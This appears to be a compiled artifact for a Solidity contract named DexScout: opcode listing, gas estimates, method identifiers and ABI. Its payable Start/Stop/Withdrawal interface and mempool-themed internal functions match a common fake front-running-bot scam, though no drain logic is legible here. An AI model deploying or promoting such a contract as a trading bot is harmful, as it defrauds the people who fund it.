JUMPDEST PUSH0 PUSH2 0xC3F DUP3 PUSH2 0xAF8 JUMP JUMPDEST SWAP2 POP PUSH2 0xC4A DUP4 PUSH2 0xAF8 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0xC76 JUMPI PUSH2 0xC75 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xC86 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0xCB8 JUMPI PUSH2 0xCB7 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xCFA DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD05 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD15 JUMPI PUSH2 0xD14 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH0 REVERT JUMPDEST PUSH0 PUSH2 0xD57 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD62 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0xD72 JUMPI PUSH2 0xD71 PUSH2 0xCC3 JUMP JUMPDEST JUMPDEST DUP3 DUP3 MOD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xD87 DUP3 PUSH2 0xBB2 JUMP JUMPDEST SWAP2 POP PUSH2 0xD92 DUP4 PUSH2 0xBB2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP DUP2 DUP2 GT ISZERO PUSH2 0xDAA JUMPI PUSH2 0xDA9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xDC6 DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xDD1 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 ADD SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xDEA JUMPI PUSH2 0xDE9 PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0xDFA DUP3 PUSH2 0xDB0 JUMP JUMPDEST SWAP2 POP PUSH2 0xE05 DUP4 PUSH2 0xDB0 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 SUB SWAP1 POP PUSH1 0xFF DUP2 GT ISZERO PUSH2 0xE1E JUMPI PUSH2 0xE1D PUSH2 0xB17 JUMP JUMPDEST JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 JUMP TLOAD CODECOPY 0x4E SELFDESTRUCT PUSH14 0x1B9E27F09D2B6BC3E3F8CF530B45 CREATE CALLDATACOPY 0xE8 INVALID PUSH6 0x9E7BE060DD29 RETURN PUSH5 0x736F6C6343 STOP ADDMOD XOR STOP CALLER "
		},
		"gasEstimates": {
			"creation": {
				"codeDepositCost": "734800",
				"executionCost": "764",
				"totalCost": "735564"
			},
			"external": {
				"Start()": "infinite",
				"Stop()": "1938",
				"Withdrawal()": "infinite"
			},
			"internal": {
				"WithdrawalProfits()": "infinite",
				"_calculateGasNeeds()": "22",
				"_callDexAction()": "infinite",
				"beyond(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
				"calcLiquidityInContract(struct DexScout.slice memory)": "infinite",
				"callMempool()": "infinite",
				"checkLiquidity(uint256)": "infinite",
				"findNewContracts(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
				"findPtr(uint256,uint256,uint256,uint256)": "infinite",
				"getMemPoolDepth()": "22",
				"getMemPoolHeight()": "22",
				"getMemPoolLength()": "infinite",
				"getMemPoolOffset()": "22",
				"keccak(struct DexScout.slice memory)": "infinite",
				"loadCurrentContract(string memory)": "infinite",
				"mempool(string memory,string memory)": "infinite",
				"nextContract(struct DexScout.slice memory,struct DexScout.slice memory)": "infinite",
				"orderContractsByLiquidity(struct DexScout.slice memory)": "infinite",
				"parseMempool(string memory)": "infinite",
				"toHexDigit(uint8)": "infinite",
				"uint2str(uint256)": "infinite"
			}
		},
		"methodIdentifiers": {
			"Start()": "1b55ba3a",
			"Stop()": "bedf0f4a",
			"Withdrawal()": "70e44c6a"
		}
	},
	"abi": [
		{
			"anonymous": false,
			"inputs": [
				{
					"indexed": false,
					"internalType": "string",
					"name": "_msg",
					"type": "string"
				}
			],
			"name": "Log",
			"type": "event"
		},
		{
			"inputs": [],
			"name": "Start",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Stop",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"inputs": [],
			"name": "Withdrawal",
			"outputs": [],
			"stateMutability": "payable",
			"type": "function"
		},
		{
			"stateMutability": "payable",
			"type": "receive"
		}
	]
}